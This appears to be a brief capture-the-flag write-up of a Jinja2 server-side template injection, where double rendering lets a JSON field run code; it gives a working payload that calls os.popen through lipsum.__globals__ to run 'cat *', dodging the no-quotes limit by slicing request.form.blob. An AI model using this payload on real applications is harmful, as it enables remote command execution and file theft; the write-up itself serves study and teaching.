The data inside the object is rendered twice, leading to a SSTI vulnerability. The only catch is that you can't use quotes, because `render_template_string` renders the quotes as the html object instead. To get around this, you can use `request.form.blob` to access the blob string itself.

Pretty much any of the payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2) should work, see my exploit below.


```
[
    {
        "repo_name": "{{lipsum.__globals__.os.popen(request.form.blob[181:186]).read()}}",
        "flaky_tests": 9001,
        "prs_blocked": 2,
        "time_lost": "cat *"
    }
]
```